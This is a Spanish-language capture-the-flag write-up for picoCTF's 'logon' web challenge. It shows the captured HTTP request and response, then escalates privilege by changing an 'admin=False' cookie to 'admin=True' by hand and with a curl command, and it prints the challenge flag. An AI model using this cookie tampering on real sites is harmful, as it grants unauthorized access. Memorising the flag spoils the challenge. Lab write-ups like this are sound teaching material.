# logon

## Descripcion
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573
## Solucion
Primero vamos al reto con el link que nos proporcionan:
```link 
https://jupiter.challenges.picoctf.org/problem/44573/
```

Probamos a logearnos con las credenciales predeterminadas como admin, admin
Vemos que nos logea de forma exitosa, pero no nos da la flag, entonces ahora comenzamos a analizar el proceso de logearse con burpsuite:

Vemos como se forma la peticion:
```
GET /problem/44573/flag HTTP/1.1
Host: jupiter.challenges.picoctf.org
Cookie: password=admin; username=admin; admin=False
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://jupiter.challenges.picoctf.org/problem/44573/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive


```

El sitio nos da esta respeusta:
```
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 24 Mar 2025 18:35:15 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: session=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
Strict-Transport-Security: max-age=0
Content-Length: 1924

<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>
        
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
        
        
        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <!-- <strong>Title</strong> --> Success: You logged in! Not sure you&#39;ll be able to see the flag though.
            </div>
      
      
      
        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>No flag for you</b></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
    <script>
    $(document).ready(function(){
        $(".close").click(function(){
            $("myAlert").alert("close");
        });
    });
    </script>
</body>

</html>
```

Entonces al ver esto, simplemente editamos el valor de la cookie de admin de False a True.
```
Cookie: password=admin; username=admin; admin=True
```

Y la respuesta nos regresa la flag:
```flag
picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}
```

## Notas adicionales

Se puede resolver con curl con el siguiente comando:
```bash
curl http://jupiter.challenges.picoctf.org:44573/flag -H "Cookie: password=admin; username=admin; admin=True"
```

## Referencias
